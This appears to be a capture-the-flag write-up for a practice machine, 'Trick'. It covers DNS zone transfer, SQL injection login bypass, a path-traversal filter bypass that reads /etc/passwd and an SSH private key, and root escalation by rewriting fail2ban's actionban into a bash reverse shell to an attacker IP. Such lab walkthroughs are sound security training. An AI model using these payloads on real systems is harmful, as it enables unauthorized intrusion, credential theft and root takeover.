## Enumeration

Initial nmap scan:

```
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
25/tcp open  smtp?
53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux)
80/tcp open  http    nginx 1.14.2
|_http-title: Coming Soon - Start Bootstrap Theme
```

Port 80 serves a static "Coming Soon" placeholder. Directory brute-forcing only returns default asset folders (`css`, `js`, `assets`), no actionable content.

With DNS (port 53) exposed, the zone is queried for a possible AXFR misconfiguration:

```
dig axfr @10.129.227.180 trick.htb
```

```
trick.htb.                  604800  IN  SOA  trick.htb. root.trick.htb. ...
trick.htb.                  604800  IN  NS   trick.htb.
trick.htb.                  604800  IN  A    127.0.0.1
preprod-payroll.trick.htb.  604800  IN  CNAME trick.htb.
```

The transfer succeeds and discloses `preprod-payroll.trick.htb`, a host not linked anywhere on the public site. Added to `/etc/hosts`.

## Web Exploitation

### Authentication bypass via SQL injection

`preprod-payroll.trick.htb` hosts a login page for a "Payroll Management System". The login form is vulnerable to SQL injection:

```sql
admin' or 1=1 LIMIT 1 -- -
```

This bypasses authentication and confirms the injection, but the authenticated panel does not expose any direct path to code execution.

### Virtual host enumeration

Given the injection was found on a preprod host, virtual host fuzzing is performed against the same IP to identify sibling hosts:

```
ffuf -u http://10.129.227.180 -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt \
  -H "Host: preprod-FUZZ.trick.htb" -fs 5480
```

```
marketing  [Status: 200, Size: 9660]
payroll    [Status: 302, Size: 9546]
```

`preprod-marketing.trick.htb` is added to `/etc/hosts`. The site includes content via a `page` parameter, a common Local File Inclusion indicator.

### Local File Inclusion

```
index.php?page=....//....//
```

The parameter is vulnerable. Path traversal is chained (`../../`) to reach the filesystem root and read `/etc/passwd`, disclosing a non-system account: **michael**.

Basic single-pass sanitization (stripping `../`) is bypassed using a nested traversal sequence (`....//`), which collapses back into `../` after the filter's single substitution pass and defeats it:

```
GET /index.php?page=....//....//....//....//....//....//home/michael/.ssh/id_rsa HTTP/1.1
Host: preprod-marketing.trick.htb
```

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
...
-----END OPENSSH PRIVATE KEY-----
```

michael's private key is retrieved directly, providing SSH access:

```
ssh -i id_rsa michael@trick.htb
```

```
michael@trick:~$ id
uid=1001(michael) gid=1001(michael),groups=1001(michael),1002(security)
```

## Privilege Escalation

### Enumeration

```
michael@trick:~$ sudo -l
User michael may run the following commands on trick:
    (root) NOPASSWD: /etc/init.d/fail2ban restart
```

michael can restart `fail2ban` as root without a password. On its own this grants nothing — restarting a service with a legitimate configuration has no effect. It becomes relevant only if the configuration itself can be altered before the restart.

The `id` output also shows membership in the secondary group `security`. Searching for group-owned resources:

```
michael@trick:/etc/fail2ban$ find / -group security 2>/dev/null
/etc/fail2ban/action.d
```

`/etc/fail2ban/action.d` is writable by the `security` group. This directory holds the action configuration files fail2ban executes on jail lifecycle events. Combined with the sudo permission, this gives full control over the commands executed by a root-owned process.

### Resolving the correct action file

fail2ban runs as root — required to manipulate `iptables` — and delegates the actual ban/unban commands to shell strings defined in `/etc/fail2ban/action.d/*.conf`, invoked via directives such as `actionstart`, `actionban`, `actionunban`. Modifying these directives changes what a root process executes.

The most obvious candidate, `iptables.conf`, does not correspond to the file actually in use. Checking the active jail configuration:

```
michael@trick:/etc/fail2ban/action.d$ grep -E "^\[|enabled|action" /etc/fail2ban/jail.conf
banaction = iptables-multiport
action_ = %(banaction)s[name=%(__name__)s, ...]
action = %(action_)s
[sshd]
```

```
michael@trick:/etc/fail2ban/action.d$ cat /etc/fail2ban/jail.d/*.conf
[sshd]
enabled = true
```

The `sshd` jail is active and does not override `action`, so it inherits `banaction = iptables-multiport` from `[DEFAULT]`. The file actually invoked is `iptables-multiport.conf`, not `iptables.conf`.

### Choosing the trigger directive

`actionstart` fires once when the jail starts and proved unreliable in this environment, likely due to service/jail initialization timing. `actionban` fires each time an IP exceeds the configured `maxretry`/`findtime` threshold — an event the attacker can trigger deliberately and repeatedly from outside, making it a more reliable hook.

### Operational constraints

Files under `/etc/fail2ban/action.d` remain root-owned even though the directory is group-writable. Moving a file to `/tmp` retains root ownership, and `/tmp`'s sticky bit then blocks removal by a non-owner (`rm: Operation not permitted`). The reliable approach is to edit the file in place, which is permitted by the directory's group write access:

```bash
cd /etc/fail2ban/action.d
sed -i "/^actionban = /d" iptables-multiport.conf
echo "actionban = bash -c 'bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1'" >> iptables-multiport.conf
```

A cron job periodically resets `/etc/fail2ban/action.d` to its original state, requiring the edit, restart, and trigger steps to be executed within the same short window.

### Exploitation

Listener on the attacking host:

```bash
nc -lvnp 4444
```

On the target, apply the edit and restart the service via the sudo permission:

```bash
sudo /etc/init.d/fail2ban restart
```

From the attacking host, generate failed SSH authentication attempts to exceed `maxretry` and trigger the ban:

```bash
ssh micheal@trick.htb
micheal@trick.htb's password:
Permission denied, please try again.
micheal@trick.htb's password:
Permission denied, please try again.
micheal@trick.htb's password:
```

fail2ban bans the source IP and executes the configured `actionban` command with root privileges, yielding a reverse shell:

```
# nc -lvnp 4444
...
listening on [any] 4444 ...
connect to [10.10.14.245] from (UNKNOWN) [10.129.227.180] 45728
bash: cannot set terminal process group (2844): Inappropriate ioctl for device
bash: no job control in this shell
root@trick:/#
```
